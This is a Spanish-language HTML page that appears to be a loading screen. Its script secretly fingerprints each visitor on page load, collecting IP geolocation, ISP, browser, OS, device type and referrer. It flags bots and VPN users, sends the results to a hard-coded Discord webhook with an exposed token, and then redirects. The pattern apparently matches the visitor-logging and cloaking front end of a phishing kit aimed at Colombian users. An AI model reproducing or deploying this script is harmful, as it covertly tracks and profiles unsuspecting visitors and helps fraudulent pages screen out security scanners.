<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Cargando…</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  html,body{margin:0;height:100%;background:#fff;font-family:Arial,sans-serif;overflow:hidden}
  #loader{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:#fff;z-index:9999;padding:20px;box-sizing:border-box}
  #loader img{
    width:min(320px, 78vw);
    max-width:100%;
    height:auto;
    display:block;
    animation: bounceGlow 2.4s ease-in-out infinite;
    transform-origin:center;
    filter: drop-shadow(0 8px 22px rgba(0,0,0,.14));
  }
  #loader span{margin-top:14px;color:#222;font-size:clamp(14px,2.2vw,18px);font-weight:600;letter-spacing:0.3px;text-align:center}
  @keyframes bounceGlow{
    0%,100%{transform:translateY(0) scale(1) rotate(0deg)}
    25%{transform:translateY(-6px) scale(1.03) rotate(-2deg)}
    50%{transform:translateY(0) scale(1.08) rotate(0deg)}
    75%{transform:translateY(-3px) scale(1.04) rotate(2deg)}
  }
  @media (max-width:600px){
    #loader{padding:16px}
    #loader img{width:min(220px, 84vw)}
  }
  @media (max-width:400px){
    #loader img{width:min(180px, 86vw)}
    #loader span{font-size:13px}
  }
  @media (orientation: landscape) and (max-height:500px){
    #loader img{width:min(180px, 42vh)}
  }
</style>
</head>
<body>
  <div id="loader" style="display:none">
    <img src="loading.gif" alt="Cargando..." />
  </div>

<script>
setTimeout(() => {
  document.getElementById('loader').style.display = 'flex';
}, 5500);
/* ========= CONFIG ========= */
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1488372054909521940/e0NWEoaqCZUMiJyXD8DPuWlJfyV-xZCio_GXV-WboZT5kScg9aoX8SVahiBXY_JvtkmF';
const REDIR_URL   = '';
/* ========================== */

(async () => {
  const UA = navigator.userAgent;
  const esBot = /bot|crawler|spider|curl|wget|scraping/i.test(UA);

  /* ---------- GEO + ORG ---------- */
  const { country = 'XX', city = 'Desconocida', org = '' } = await fetch('https://ipinfo.io/json')
    .then(r => r.json())
    .catch(() => ({}));

  /* ---------- PROXY / VPN ---------- */
  const esProxy = /vpn|proxy|hosting|datacenter|cloud/i.test(org);

  /* ---------- NAVEGADOR ---------- */
  let navegador = 'Desconocido';
  if (/edg\//i.test(UA)) navegador = 'Edge';
  else if (/brave/i.test(UA)) navegador = 'Brave';
  else if (/opera|opr\//i.test(UA)) navegador = 'Opera';
  else if (/chrome|chromium/i.test(UA) && !/edge|opr\//i.test(UA)) navegador = 'Chrome';
  else if (/safari/i.test(UA) && !/chrome|chromium/i.test(UA)) navegador = 'Safari';
  else if (/firefox|fxios/i.test(UA)) navegador = 'Firefox';

  /* ---------- SISTEMA OPERATIVO ---------- */
  let so = 'Desconocido';
  if (/windows nt 10/i.test(UA)) so = 'Windows 10/11';
  else if (/windows nt 6.3/i.test(UA)) so = 'Windows 8.1';
  else if (/windows nt 6.2/i.test(UA)) so = 'Windows 8';
  else if (/windows nt 6.1/i.test(UA)) so = 'Windows 7';
  else if (/macintosh|mac os x/i.test(UA)) so = 'macOS';
  else if (/kali/i.test(UA)) so = 'Kali Linux';
  else if (/ubuntu/i.test(UA)) so = 'Ubuntu';
  else if (/linux/i.test(UA)) so = 'Linux';
  else if (/android/i.test(UA)) so = 'Android';
  else if (/iphone|ipad/i.test(UA)) so = 'iOS';

  /* ---------- TIPO DE DISPOSITIVO ---------- */
  let dispositivo = 'Escritorio';
  if (/mobi/i.test(UA)) dispositivo = 'Móvil';
  else if (/tablet|ipad|playbook|silk/i.test(UA)) dispositivo = 'Tablet';
  else if (/smart-tv|hbbtv|appletv|googletv|viera/i.test(UA)) dispositivo = 'Smart-TV';

  /* ---------- SENSOR TÁCTIL ---------- */
  const tactil = ('maxTouchPoints' in navigator && navigator.maxTouchPoints > 0) ||
                 (window.matchMedia && window.matchMedia('(pointer: coarse)').matches) ||
                 ('ontouchstart' in window);

  /* ---------- REFERRER ---------- */
  const referrer = document.referrer || 'Directo / sin referrer';

  /* ---------- DOMINIO ACTUAL ---------- */
  const dominioActual = location.hostname || 'Dominio no detectado';

  /* ---------- FECHA / HORA ---------- */
  const ahora = new Date();
  const fechaHora = ahora.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
/* ---------- CONTADOR DIARIO ---------- */
  const hoy = ahora.toISOString().slice(0, 10);
  const clave = `ingresos_${hoy}`;
  let num = parseInt(localStorage.getItem(clave) || '0', 10);
  num += 1;
  localStorage.setItem(clave, num.toString());

  /* ---------- EMBED ---------- */
  const embed = {
    color: esBot ? 0xff0000 : (esProxy ? 0xff9900 : (country === 'CO' ? 0x00ff00 : 0x0099ff)),
    title: esBot ? '🤖 Bot detectado' : (esProxy ? '🕵️ Proxy/VPN detectado' : (country === 'CO' ? '✅ Humano en Colombia' : '❌ Humano fuera de Colombia')),
    thumbnail: { url: 'https://i.postimg.cc/fyZQ1Dyy/coolcloud-icono.png' },
    fields: [
      { name: '📅 Fecha y hora', value: fechaHora, inline: true },
      { name: '🔢 Ingreso del día', value: `#${num}`, inline: true },
      { name: '🌍 Ubicación', value: `${city}, ${country === 'CO' ? 'Colombia' : country}`, inline: true },
      { name: '🌐 Navegador', value: navegador, inline: true },
      { name: '💻 Sistema Operativo', value: so, inline: true },
      { name: '📡 Organización', value: org || 'Sin datos', inline: true },
      { name: '📱 Tipo de dispositivo', value: dispositivo, inline: true },
      { name: '👆 Sensor táctil', value: tactil ? '✅ Sí' : '❌ No', inline: true },
      { name: '🔗 Referrer', value: referrer, inline: false },
      { name: '🏠 Dominio actual', value: dominioActual, inline: false }
    ],
    footer: { text: 'Sistema de ingresos' },
    timestamp: new Date().toISOString()
  };

  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ embeds: [embed] })
  });

  /* ---------- REDIRECCIÓN ---------- */
  setTimeout(() => {
    location.href = REDIR_URL;
  }, 3000);
})();
</script>
</body>
</html>
